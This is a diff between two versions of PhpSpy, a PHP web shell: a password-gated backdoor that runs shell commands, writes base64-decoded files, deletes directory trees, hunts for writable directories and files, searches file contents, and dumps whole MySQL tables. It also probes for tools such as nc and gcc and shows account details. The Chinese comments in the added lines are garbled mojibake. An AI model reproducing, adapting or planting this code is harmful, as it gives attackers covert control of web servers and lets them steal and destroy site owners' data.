+	secparam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
+	secparam('cURL support', function_exists('curl_version')?'enabled':'no');
+	$temp=array();
+	if(function_exists('mysql_get_client_info'))
+		$temp[] = "MySql (".mysql_get_client_info().")";
+	if(function_exists('mssql_connect'))
+		$temp[] = "MSSQL";
+	if(function_exists('pg_connect'))
+		$temp[] = "PostgreSQL";
+	if(function_exists('oci_connect'))
+		$temp[] = "Oracle";
+	secparam('Supported databases', implode(', ', $temp));
 
 	if( !IS_WIN ) {
 		$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
@@ -1077,16 +1575,8 @@ else {
 ?>
 </td></tr></table>
 <div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">
-	<span style="float:right;">
-	<?php
-	debuginfo();
-	ob_end_flush();
-	if (isset($DB)) {
-		echo '. '.$DB->querycount.' queries';
-	}
-	?>
-	</span>
-	Powered by <a title="Build 20130112" href="http://www.4ngel.net" target="_blank"><?php echo str_replace('.','','P.h.p.S.p.y');?> 2013 final</a>. Copyright (C) 2004-2013 <a href="http://www.4ngel.net" target="_blank">[S4T]</a> All Rights Reserved.
+	<span style="float:right;"><?php debuginfo();ob_end_flush();?></span>
+	Powered by <a title="Build 20110502" href="http://www.4ngel.net" target="_blank"><?php echo str_replace('.','','P.h.p.S.p.y');?> 2011</a>. Copyright (C) 2004-2011 <a href="http://www.4ngel.net" target="_blank">Security Angel Team [S4T]</a> All Rights Reserved.
 </div>
 </body>
 </html>
@@ -1094,7 +1584,7 @@ else {
 <?php
 
 /*======================================================
-函数库
+鍑芥暟搴�
 ======================================================*/
 
 function secparam($n, $v) {
@@ -1114,9 +1604,6 @@ function m($msg) {
 	echo $msg;
 	echo '</div>';
 }
-function s_array($array) {
-	return is_array($array) ? array_map('s_array', $array) : stripslashes($array);
-}
 function scookie($key, $value, $life = 0, $prefix = 1) {
 	global $timestamp, $_SERVER, $cookiepre, $cookiedomain, $cookiepath, $cookielife;
 	$key = ($prefix ? $cookiepre : '').$key;
@@ -1124,14 +1611,56 @@ function scookie($key, $value, $life = 0, $prefix = 1) {
 	$useport = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;
 	setcookie($key, $value, $timestamp+$life, $cookiepath, $cookiedomain, $useport);
 }
-function loginpage() {
-	formhead();
-	makehide('act','login');
-	makeinput(array('name'=>'password','type'=>'password','size'=>'20'));
-	makeinput(array('type'=>'submit','value'=>'Login'));
-	formfoot();
-	exit;
+function multi($num, $perpage, $curpage, $tablename) {
+	$multipage = '';
+	if($num > $perpage) {
+		$page = 10;
+		$offset = 5;
+		$pages = @ceil($num / $perpage);
+		if($page > $pages) {
+			$from = 1;
+			$to = $pages;
+		} else {
+			$from = $curpage - $offset;
+			$to = $curpage + $page - $offset - 1;
+			if($from < 1) {
+				$to = $curpage + 1 - $from;
+				$from = 1;
+				if(($to - $from) < $page && ($to - $from) < $pages) {
+					$to = $page;
+				}
+			} elseif($to > $pages) {
+				$from = $curpage - $pages + $to;
+				$to = $pages;
+				if(($to - $from) < $page && ($to - $from) < $pages) {
+					$from = $pages - $page + 1;
+				}
+			}
+		}
+		$multipage = ($curpage - $offset > 1 && $pages > $page ? '<a href="javascript:settable(\''.$tablename.'\', \'\', 1);">First</a> ' : '').($curpage > 1 ? '<a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage - 1).');">Prev</a> ' : '');
+		for($i = $from; $i <= $to; $i++) {
+			$multipage .= $i == $curpage ? $i.' ' : '<a href="javascript:settable(\''.$tablename.'\', \'\', '.$i.');">['.$i.']</a> ';
+		}
+		$multipage .= ($curpage < $pages ? '<a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage + 1).');">Next</a>' : '').($to < $pages ? ' <a href="javascript:settable(\''.$tablename.'\', \'\', '.$pages.');">Last</a>' : '');
+		$multipage = $multipage ? '<p>Pages: '.$multipage.'</p>' : '';
+	}
+	return $multipage;
 }
+// 鐧婚檰鍏ュ彛
+function loginpage() {
+?>
+	<style type="text/css">
+	input {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}
+	</style>
+	<form method="POST" action="">
+	<span style="font:11px Verdana;">Password: </span><input name="password" type="password" size="20">
+	<input type="hidden" name="action" value="login">
+	<input type="submit" value="Login">
+	</form>
+<?php
+	exit;
+}//end loginpage()
+
 function execute($cfe) {
 	$res = '';
 	if ($cfe) {
@@ -1164,25 +1693,26 @@ function which($pr) {
 	$path = execute("which $pr");
 	return ($path ? $path : $pr);
 }
+
 function cf($fname,$text){
 	if($fp=@fopen($fname,'w')) {
 		@fputs($fp,@base64_decode($text));
 		@fclose($fp);
 	}
 }
-function dirsize($cwd) {
-	$dh = @opendir($cwd);
+function dirsize($dir) {
+	$dh = @opendir($dir);
 	$size = 0;
 	while($file = @readdir($dh)) {
 		if ($file != '.' && $file != '..') {
-			$path = $cwd.'/'.$file;
-			$size += @is_dir($path) ? dirsize($path) : sprintf("%u", @filesize($path));
+			$path = $dir.'/'.$file;
+			$size += @is_dir($path) ? dirsize($path) : @filesize($path);
 		}
 	}
 	@closedir($dh);
 	return $size;
 }
-// 页面调试信息
+// 椤甸潰璋冭瘯淇℃伅
 function debuginfo() {
 	global $starttime;
 	$mtime = explode(' ', microtime());
@@ -1190,7 +1720,41 @@ function debuginfo() {
 	echo 'Processed in '.$totaltime.' second(s)';
 }
 
-// 清除HTML代码
+//杩炴帴MYSQL鏁版嵁搴�
+function mydbconn($dbhost,$dbuser,$dbpass,$dbname='',$charset='',$dbport='3306') {
+	global $charsetdb;
+	@ini_set('mysql.connect_timeout', 5);
+	if(!$link = @mysql_connect($dbhost.':'.$dbport, $dbuser, $dbpass)) {
+		p('<h2>Can not connect to MySQL server</h2>');
+		exit;
+	}
+	if($link && $dbname) {
+		if (!@mysql_select_db($dbname, $link)) {
+			p('<h2>Database selected has error</h2>');
+			exit;
+		}
+	}
+	if($link && mysql_get_server_info() > '4.1') {
+		if($charset && in_array(strtolower($charset), $charsetdb)) {
+			q("SET character_set_connection=$charset, character_set_results=$charset, character_set_client=binary;", $link);
+		}
+	}
+	return $link;
+}
+
+// 鍘绘帀杞箟瀛楃
+function s_array(&$array) {
+	if (is_array($array)) {
+		foreach ($array as $k => $v) {
+			$array[$k] = s_array($v);
+		}
+	} else if (is_string($array)) {
+		$array = stripslashes($array);
+	}
+	return $array;
+}
+
+// 娓呴櫎HTML浠ｇ爜
 function html_clean($content) {
 	$content = htmlspecialchars($content);
 	$content = str_replace("\n", "<br />", $content);
@@ -1199,22 +1763,13 @@ function html_clean($content) {
 	return $content;
 }
 
-// 获取权限
-function getChmod($file){
-	return substr(base_convert(@fileperms($file),10,8),-4);
+// 鑾峰彇鏉冮檺
+function getChmod($filepath){
+	return substr(base_convert(@fileperms($filepath),10,8),-4);
 }
 
-function PermsColor($f) {
-	if (!is_readable($f)) {
-		return '<span class="red">'.getPerms($f).'</span>';
-	} elseif (!is_writable($f)) {
-		return '<span class="black">'.getPerms($f).'</span>';
-	} else {
-		return '<span class="green">'.getPerms($f).'</span>';
-	}
-}
-function getPerms($file) {
-	$mode = @fileperms($file);
+function getPerms($filepath) {
+	$mode = @fileperms($filepath);
 	if (($mode & 0xC000) === 0xC000) {$type = 's';}
 	elseif (($mode & 0x4000) === 0x4000) {$type = 'd';}
 	elseif (($mode & 0xA000) === 0xA000) {$type = 'l';}
@@ -1241,9 +1796,9 @@ function getPerms($file) {
 	return $type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].$world['write'].$world['execute'];
 }
 
-function getUser($file)	{
+function getUser($filepath)	{
 	if (function_exists('posix_getpwuid')) {
-		$array = @posix_getpwuid(@fileowner($file));
+		$array = @posix_getpwuid(@fileowner($filepath));
 		if ($array && is_array($array)) {
 			return ' / <a href="#" title="User: '.$array['name'].'&#13&#10Passwd: '.$array['passwd'].'&#13&#10Uid: '.$array['uid'].'&#13&#10gid: '.$array['gid'].'&#13&#10Gecos: '.$array['gecos'].'&#13&#10Dir: '.$array['dir'].'&#13&#10Shell: '.$array['shell'].'">'.$array['name'].'</a>';
 		}
@@ -1251,59 +1806,46 @@ function getUser($file)	{
 	return '';
 }
 
-function copy_paste($c,$f,$d){
-	if(is_dir($c.$f)){
-		mkdir($d.$f);
-		$dirs = scandir($c.$f);
-		if ($dirs) {
-			$dirs = array_diff($dirs, array('..', '.'));
-			foreach ($dirs as $file) {
-				copy_paste($c.$f.'/',$file, $d.$f.'/');
-			}
-		}
-	} elseif(is_file($c.$f)) {
-		copy($c.$f, $d.$f);
-	}
-}
-// 删除目录
+// 鍒犻櫎鐩綍
 function deltree($deldir) {
-	$dirs = @scandir($deldir);
-	if ($dirs) {
-		$dirs = array_diff($dirs, array('..', '.'));
-		foreach ($dirs as $file) {
-			if((is_dir($deldir.'/'.$file))) {
-				@chmod($deldir.'/'.$file,0777);
-				deltree($deldir.'/'.$file);
-			} else {
-				@chmod($deldir.'/'.$file,0777);
-				@unlink($deldir.'/'.$file);
-			}
+	$mydir=@dir($deldir);
+	while($file=$mydir->read())	{
+		if((is_dir($deldir.'/'.$file)) && ($file!='.') && ($file!='..')) {
+			@chmod($deldir.'/'.$file,0777);
+			deltree($deldir.'/'.$file);
 		}
-		@chmod($deldir,0777);
-		return @rmdir($deldir) ? 1 : 0;
-	} else {
-		return 0;
+		if (is_file($deldir.'/'.$file)) {
+			@chmod($deldir.'/'.$file,0777);
+			@unlink($deldir.'/'.$file);
+		}
 	}
+	$mydir->close();
+	@chmod($deldir,0777);
+	return @rmdir($deldir) ? 1 : 0;
 }
 
-// 表格行间的背景色替换
+// 琛ㄦ牸琛岄棿鐨勮儗鏅壊鏇挎崲
 function bg() {
 	global $bgc;
 	return ($bgc++%2==0) ? 'alt1' : 'alt2';
 }
 
-function cmp($a, $b) {
-	global $sort;
-	if(is_numeric($a[$sort[0]])) {
-		return (($a[$sort[0]] < $b[$sort[0]]) ? -1 : 1)*($sort[1]?1:-1);
-	} else {
-		return strcmp($a[$sort[0]], $b[$sort[0]])*($sort[1]?1:-1);
+// 鑾峰彇褰撳墠鐨勬枃浠剁郴缁熻矾寰�
+function getPath($scriptpath, $nowpath) {
+	if ($nowpath == '.') {
+		$nowpath = $scriptpath;
 	}
+	$nowpath = str_replace('\\', '/', $nowpath);
+	$nowpath = str_replace('//', '/', $nowpath);
+	if (substr($nowpath, -1) != '/') {
+		$nowpath = $nowpath.'/';
+	}
+	return $nowpath;
 }
 
-// 获取当前目录的上级目录
-function getUpPath($cwd) {
-	$pathdb = explode('/', $cwd);
+// 鑾峰彇褰撳墠鐩綍鐨勪笂绾х洰褰�
+function getUpPath($nowpath) {
+	$pathdb = explode('/', $nowpath);
 	$num = count($pathdb);
 	if ($num > 2) {
 		unset($pathdb[$num-1],$pathdb[$num-2]);
@@ -1313,7 +1855,7 @@ function getUpPath($cwd) {
 	return $uppath;
 }
 
-// 检查PHP配置参数
+// 妫€鏌HP閰嶇疆鍙傛暟
 function getcfg($varname) {
 	$result = get_cfg_var($varname);
 	if ($result == 0) {
@@ -1325,46 +1867,187 @@ function getcfg($varname) {
 	}
 }
 
-// 获得文件扩展名
+// 妫€鏌ュ嚱鏁版儏鍐�
+function getfun($funName) {
+	return (false !== function_exists($funName)) ? 'Yes' : 'No';
+}
+
+// 鑾峰緱鏂囦欢鎵╁睍鍚�
 function getext($file) {
 	$info = pathinfo($file);
 	return $info['extension'];
 }
-function GetWDirList($path){
-	global $dirdata,$j,$web_cwd;
+
+function GetWDirList($dir){
+	global $dirdata,$j,$nowpath;
 	!$j && $j=1;
-	$dirs = @scandir($path);
-	if ($dirs) {
-		$dirs = array_diff($dirs, array('..','.'));
-		foreach ($dirs as $file) {
-			$f=str_replace('//','/',$path.'/'.$file);
-			if(is_dir($f)){
+	if ($dh = opendir($dir)) {
+		while ($file = readdir($dh)) {
+			$f=str_replace('//','/',$dir.'/'.$file);
+			if($file!='.' && $file!='..' && is_dir($f)){
 				if (is_writable($f)) {
-					$dirdata[$j]['filename']='/'.str_replace($web_cwd,'',$f);
+					$dirdata[$j]['filename']=str_replace($nowpath,'',$f);
 					$dirdata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
-					$dirdata[$j]['chmod']=getChmod($f);
-					$dirdata[$j]['perm']=PermsColor($f);
-					$dirdata[$j]['owner']=getUser($f);
-					$dirdata[$j]['link']=$f;
+					$dirdata[$j]['dirchmod']=getChmod($f);
+					$dirdata[$j]['dirperm']=getPerms($f);
+					$dirdata[$j]['dirlink']=$dir;
+					$dirdata[$j]['server_link']=$f;
 					$j++;
 				}
 				GetWDirList($f);
 			}
 		}
+		closedir($dh);
+		clearstatcache();
 		return $dirdata;
 	} else {
 		return array();
 	}
 }
-function sizecount($size) {
-	$unit = array('Bytes', 'KB', 'MB', 'GB', 'TB','PB');
-	for ($i = 0; $size >= 1024 && $i < 5; $i++) {
-		$size /= 1024;
+
+function GetWFileList($dir){
+	global $filedata,$j,$nowpath, $writabledb;
+	!$j && $j=1;
+	if ($dh = opendir($dir)) {
+		while ($file = readdir($dh)) {
+			$ext = getext($file);
+			$f=str_replace('//','/',$dir.'/'.$file);
+			if($file!='.' && $file!='..' && is_dir($f)){
+				GetWFileList($f);
+			} elseif($file!='.' && $file!='..' && is_file($f) && in_array($ext, explode(',', $writabledb))){
+				if (is_writable($f)) {
+					$filedata[$j]['filename']=str_replace($nowpath,'',$f);
+					$filedata[$j]['size']=sizecount(@filesize($f));
+					$filedata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
+					$filedata[$j]['filechmod']=getChmod($f);
+					$filedata[$j]['fileperm']=getPerms($f);
+					$filedata[$j]['fileowner']=getUser($f);
+					$filedata[$j]['dirlink']=$dir;
+					$filedata[$j]['server_link']=$f;
+					$j++;
+				}
+			}
+		}
+		closedir($dh);
+		clearstatcache();
+		return $filedata;
+	} else {
+		return array();
 	}
-	return round($size, 2).' '.$unit[$i];
 }
+
+function GetSFileList($dir, $content, $re = 0) {
+	global $filedata,$j,$nowpath, $writabledb;
+	!$j && $j=1;
+	if ($dh = opendir($dir)) {
+		while ($file = readdir($dh)) {
+			$ext = getext($file);
+			$f=str_replace('//','/',$dir.'/'.$file);
+			if($file!='.' && $file!='..' && is_dir($f)){
+				GetSFileList($f, $content, $re = 0);
+			} elseif($file!='.' && $file!='..' && is_file($f) && in_array($ext, explode(',', $writabledb))){
+				$find = 0;
+				if ($re) {
+					if ( preg_match('@'.$content.'@',$file) || preg_match('@'.$content.'@', @file_get_contents($f)) ){
+						$find = 1;
+					}
+				} else {
+					if ( strstr($file, $content) || strstr( @file_get_contents($f),$content ) ) {
+						$find = 1;
+					}
+				}
+				if ($find) {
+					$filedata[$j]['filename']=str_replace($nowpath,'',$f);
+					$filedata[$j]['size']=sizecount(@filesize($f));
+					$filedata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
+					$filedata[$j]['filechmod']=getChmod($f);
+					$filedata[$j]['fileperm']=getPerms($f);
+					$filedata[$j]['fileowner']=getUser($f);
+					$filedata[$j]['dirlink']=$dir;
+					$filedata[$j]['server_link']=$f;
+					$j++;
+				}
+			}
+		}
+		closedir($dh);
+		clearstatcache();
+		return $filedata;
+	} else {
+		return array();
+	}
+}
+
+function qy($sql) {
+	global $mysqllink;
+	//echo $sql.'<br>';
+	$res = $error = '';
+	if(!$res = @mysql_query($sql,$mysqllink)) {
+		return 0;
+	} else if(is_resource($res)) {
+		return 1;
+	} else {
+		return 2;
+	}
+	return 0;
+}
+
+function q($sql) {
+	global $mysqllink;
+	return @mysql_query($sql,$mysqllink);
+}
+
+function fr($qy){
+	mysql_free_result($qy);
+}
+
+function sizecount($fileSize) {
+	$size = sprintf("%u", $fileSize);
+	if($size == 0) {
+		return '0 Bytes' ;
+	}
+	$sizename = array(' Bytes', ' KB', ' MB', ' GB', ' TB', ' PB', ' EB', ' ZB', ' YB');
+	return round( $size / pow(1024, ($i = floor(log($size, 1024)))), 2) . $sizename[$i];
+}
+// 澶囦唤鏁版嵁搴�
+function sqldumptable($table, $fp=0) {
+	global $mysqllink;
+
+	$tabledump = "DROP TABLE IF EXISTS `$table`;\n";
+	$res = q("SHOW CREATE TABLE $table");
+	$create = mysql_fetch_row($res);
+	$tabledump .= $create[1].";\n\n";
+
+	if ($fp) {
+		fwrite($fp,$tabledump);
+	} else {
+		echo $tabledump;
+	}
+	$tabledump = '';
+	$rows = q("SELECT * FROM $table");
+	while ($row = mysql_fetch_assoc($rows)) {
+		foreach($row as $k=>$v) {
+			$row[$k] = "'".@mysql_real_escape_string($v)."'";
+		}
+		$tabledump = 'INSERT INTO `'.$table.'` VALUES ('.implode(", ", $row).');'."\n";
+		if ($fp) {
+			fwrite($fp,$tabledump);
+		} else {
+			echo $tabledump;
+		}
+	}
+	fwrite($fp,"\n\n");
+	fr($rows);
+}
+
 function p($str){
 	echo $str."\n";
+}
+
+function tbhead() {
+	p('<table width="100%" border="0" cellpadding="4" cellspacing="0">');
+}
+function tbfoot(){
+	p('</table>');
 }
 
 function makehide($name,$value=''){
@@ -1372,48 +2055,64 @@ function makehide($name,$value=''){
 }
 
 function makeinput($arg = array()){
-	$arg['size'] = isset($arg['size']) && $arg['size'] > 0 ? "size=\"$arg[size]\"" : "size=\"100\"";
-	$arg['type'] = isset($arg['type']) ? $arg['type'] : 'text';
-	$arg['title'] = isset($arg['title']) ? $arg['title'].'<br />' : '';
-	$arg['class'] = isset($arg['class']) ? $arg['class'] : 'input';
-	$arg['name'] = isset($arg['name']) ? $arg['name'] : '';
-	$arg['value'] = isset($arg['value']) ? $arg['value'] : '';
-	if (isset($arg['newline'])) p('<p>');
-	p("$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] />");
-	if (isset($arg['newline'])) p('</p>');
+	$arg['size'] = $arg['size'] > 0 ? "size=\"$arg[size]\"" : "size=\"100\"";
+	$arg['extra'] = $arg['extra'] ? $arg['extra'] : '';
+	!$arg['type'] && $arg['type'] = 'text';
+	$arg['title'] = $arg['title'] ? $arg['title'].'<br />' : '';
+	$arg['class'] = $arg['class'] ? $arg['class'] : 'input';
+	if ($arg['newline']) {
+		p("<p>$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /></p>");
+	} else {
+		p("$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] />");
+	}
 }
 
 function makeselect($arg = array()){
-	$onchange = isset($arg['onchange']) ? 'onchange="'.$arg['onchange'].'"' : '';
-	$arg['title'] = isset($arg['title']) ? $arg['title'] : '';
-	$arg['name'] = isset($arg['name']) ? $arg['name'] : '';
+	if ($arg['onchange']) {
+		$onchange = 'onchange="'.$arg['onchange'].'"';
+	}
+	$arg['title'] = $arg['title'] ? $arg['title'] : '';
+	if ($arg['newline']) p('<p>');
 	p("$arg[title] <select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\" $onchange>");
 		if (is_array($arg['option'])) {
-			foreach ($arg['option'] as $key=>$value) {
-				if ($arg['selected']==$key) {
-					p("<option value=\"$key\" selected>$value</option>");
-				} else {
-					p("<option value=\"$key\">$value</option>");
+			if ($arg['nokey']) {
+				foreach ($arg['option'] as $value) {
+					if ($arg['selected']==$value) {
+						p("<option value=\"$value\" selected>$value</option>");
+					} else {
+						p("<option value=\"$value\">$value</option>");
+					}
+				}
+			} else {
+				foreach ($arg['option'] as $key=>$value) {
+					if ($arg['selected']==$key) {
+						p("<option value=\"$key\" selected>$value</option>");
+					} else {
+						p("<option value=\"$key\">$value</option>");
+					}
 				}
 			}
 		}
 	p("</select>");
+	if ($arg['newline']) p('</p>');
 }
 function formhead($arg = array()) {
-	!isset($arg['method']) && $arg['method'] = 'post';
-	!isset($arg['name']) && $arg['name'] = 'form1';
-	$arg['extra'] = isset($arg['extra']) ? $arg['extra'] : '';
-	$arg['onsubmit'] = isset($arg['onsubmit']) ? "onsubmit=\"$arg[onsubmit]\"" : '';
-	p("<form name=\"$arg[name]\" id=\"$arg[name]\" action=\"".SELF."\" method=\"$arg[method]\" $arg[onsubmit] $arg[extra]>");
-	if (isset($arg['title'])) {
+	global $self;
+	!$arg['method'] && $arg['method'] = 'post';
+	!$arg['action'] && $arg['action'] = $self;
+	$arg['target'] = $arg['target'] ? "target=\"$arg[target]\"" : '';
+	!$arg['name'] && $arg['name'] = 'form1';
+	p("<form name=\"$arg[name]\" id=\"$arg[name]\" action=\"$arg[action]\" method=\"$arg[method]\" $arg[target]>");
+	if ($arg['title']) {
 		p('<h2>'.$arg['title'].' &raquo;</h2>');
 	}
 }
 
 function maketext($arg = array()){
-	$arg['title'] = isset($arg['title']) ? $arg['title'].'<br />' : '';
-	$arg['name'] = isset($arg['name']) ? $arg['name'] : '';
-	p("<p>$arg[title]<textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name]\" cols=\"100\" rows=\"25\">$arg[value]</textarea></p>");
+	!$arg['cols'] && $arg['cols'] = 100;
+	!$arg['rows'] && $arg['rows'] = 25;
+	$arg['title'] = $arg['title'] ? $arg['title'].'<br />' : '';
+	p("<p>$arg[title]<textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name]\" cols=\"$arg[cols]\" rows=\"$arg[rows]\" $arg[extra]>$arg[value]</textarea></p>");
 }
 
 function formfooter($name = ''){
@@ -1423,8 +2122,8 @@ function formfooter($name = ''){
 }
 
 function goback(){
-	global $cwd, $charset;
-	p('<form action="'.SELF.'" method="post"><input type="hidden" name="act" value="file" /><input type="hidden" name="cwd" value="'.$cwd.'" /><input type="hidden" name="charset" value="'.$charset.'" /><p><input class="bt" type="submit" value="Go back..."></p></form>');
+	global $self, $nowpath;
+	p('<form action="'.$self.'" method="post"><input type="hidden" name="action" value="file" /><input type="hidden" name="dir" value="'.$nowpath.'" /><p><input class="bt" type="submit" value="Go back..."></p></form>');
 }
 
 function formfoot(){
@@ -1432,185 +2131,14 @@ function formfoot(){
 }
 
 function encode_pass($pass) {
-	$k = 'angel';
-	$pass = md5($k.$pass);
-	$pass = md5($pass.$k);
-	$pass = md5($k.$pass.$k);
+	$pass = md5('angel'.$pass);
+	$pass = md5($pass.'angel');
+	$pass = md5('angel'.$pass.'angel');
 	return $pass;
 }
 
-function pr($a) {
-	p('<div style="text-align: left;border:1px solid #ddd;"><pre>'.print_r($a).'</pre></div>');
+function pr($s){
+	echo "<pre>".print_r($s).'</pre>';
 }
 
-class DB_MySQL  {
-
-	var $querycount = 0;
-	var $link;
-	var $charsetdb = array();
-	var $charset = '';
-
-	function connect($dbhost, $dbuser, $dbpass, $dbname='') {
-		@ini_set('mysql.connect_timeout', 5);
-		if(!$this->link = @mysql_connect($dbhost, $dbuser, $dbpass, 1)) {
-			$this->halt('Can not connect to MySQL server');
-		}
-		if($this->version() > '4.1') {
-			$this->setcharset($this->charset);
-		}
-		$dbname && mysql_select_db($dbname, $this->link);
-	}
-	function setcharset($charset) {
-		if ($charset && $this->charsetdb[$charset]) {
-			if(function_exists('mysql_set_charset')) {
-				mysql_set_charset($this->charsetdb[$charset], $this->link);
-			} else {
-				$this->query("SET character_set_connection='".$this->charsetdb[$charset]."', character_set_results='".$this->charsetdb[$charset]."', character_set_client=binary");
-			}
-		}
-	}
-	function select_db($dbname) {
-		return mysql_select_db($dbname, $this->link);
-	}
-	function geterrdesc() {
-		return (($this->link) ? mysql_error($this->link) : mysql_error());
-	}
-	function geterrno() {
-		return intval(($this->link) ? mysql_errno($this->link) : mysql_errno());
-	}
-	function fetch($query, $result_type = MYSQL_ASSOC) { //MYSQL_NUM
-		return mysql_fetch_array($query, $result_type);
-	}
-	function query($sql) {
-		//echo '<p style="color:#f00;">'.$sql.'</p>';
-		if(!($query = mysql_query($sql, $this->link))) {
-			$this->halt('MySQL Query Error', $sql);
-		}
-		$this->querycount++;
-		return $query;
-	}
-	function query_res($sql) {
-		$res = '';
-		if(!$res = mysql_query($sql, $this->link)) {
-			$res = 0;
-		} else if(is_resource($res)) {
-			$res = 1;
-		} else {
-			$res = 2;
-		}
-		$this->querycount++;
-		return $res;
-	}
-	function num_rows($query) {
-		$query = mysql_num_rows($query);
-		return $query;
-	}
-	function num_fields($query) {
-		$query = mysql_num_fields($query);
-		return $query;
-	}
-	function affected_rows() {
-		return mysql_affected_rows($this->link);
-	}
-	function result($query, $row) {
-		$query = mysql_result($query, $row);
-		return $query;
-	}
-	function free_result($query) {
-		$query = mysql_free_result($query);
-		return $query;
-	}
-	function version() {
-		return mysql_get_server_info($this->link);
-	}
-	function close() {
-		return mysql_close($this->link);
-	}
-	function halt($msg =''){
-		echo "<h2>".htmlspecialchars($msg)."</h2>\n";
-		echo "<p class=\"b\">Mysql error description: ".htmlspecialchars($this->geterrdesc())."</p>\n";
-		echo "<p class=\"b\">Mysql error number: ".$this->geterrno()."</p>\n";
-		exit;
-	}
-	function get_fields_meta($result) {
-		$fields = array();
-		$num_fields = $this->num_fields($result);
-		for ($i = 0; $i < $num_fields; $i++) {
-			$field = mysql_fetch_field($result, $i);
-			$fields[] = $field;
-		}
-		return $fields;
-	}
-	function sqlAddSlashes($s = ''){
-		$s = str_replace('\\', '\\\\', $s);
-		$s = str_replace('\'', '\'\'', $s);
-		return $s;
-	}
-	// 备份数据库
-	function sqldump($table, $fp=0) {
-		$crlf = (IS_WIN ? "\r\n" : "\n");
-		$search = array("\x00", "\x0a", "\x0d", "\x1a"); //\x08\\x09, not required
-		$replace = array('\0', '\n', '\r', '\Z');
-
-		if (isset($this->charset) && isset($this->charsetdb[$this->charset])) {
-			$set_names = $this->charsetdb[$this->charset];
-		} else {
-			$set_names = $this->charsetdb['utf-8'];
-		}
-		$tabledump = 'SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";'.$crlf.$crlf;
-		$tabledump .= '/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;'.$crlf
-			   . '/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;'.$crlf
-			   . '/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;'.$crlf
-			   . '/*!40101 SET NAMES ' . $set_names . ' */;'.$crlf.$crlf;
-
-		$tabledump .= "DROP TABLE IF EXISTS `$table`;".$crlf;
-		$res = $this->query("SHOW CREATE TABLE $table");
-		$create = $this->fetch($res, MYSQL_NUM);
-		$tabledump .= $create[1].';'.$crlf.$crlf;
-		if (strpos($tabledump, "(\r\n ")) {
-			$tabledump = str_replace("\r\n", $crlf, $tabledump);
-		} elseif (strpos($tabledump, "(\n ")) {
-			$tabledump = str_replace("\n", $crlf, $tabledump);
-		} elseif (strpos($tabledump, "(\r ")) {
-			$tabledump = str_replace("\r", $crlf, $tabledump);
-		}
-		unset($create);
-
-		if ($fp) {
-			fwrite($fp,$tabledump);
-		} else {
-			echo $tabledump;
-		}
-		$tabledump = '';
-		$rows = $this->query("SELECT * FROM $table");
-		$fields_cnt = $this->num_fields($rows);
-		$fields_meta = $this->get_fields_meta($rows);
-
-		while ($row = $this->fetch($rows, MYSQL_NUM)) {
-			for ($j = 0; $j < $fields_cnt; $j++) {
-				if (!isset($row[$j]) || is_null($row[$j])) {
-					$values[] = 'NULL';
-				} elseif ($fields_meta[$j]->numeric && $fields_meta[$j]->type != 'timestamp' && !$fields_meta[$j]->blob) {
-					$values[] = $row[$j];
-				} elseif ($fields_meta[$j]->blob) {
-					if (empty($row[$j]) && $row[$j] != '0') {
-						$values[] = '\'\'';
-					} else {
-						$values[] = '0x'.bin2hex($row[$j]);
-					}
-				} else {
-					$values[] = '\''.str_replace($search, $replace, $this->sqlAddSlashes($row[$j])).'\'';
-				}
-			}
-			$tabledump = 'INSERT INTO `'.$table.'` VALUES('.implode(', ', $values).');'.$crlf;
-			unset($values);
-			if ($fp) {
-				fwrite($fp,$tabledump);
-			} else {
-				echo $tabledump;
-			}
-		}
-		$this->free_result($rows);
-	}
-}
 ?>
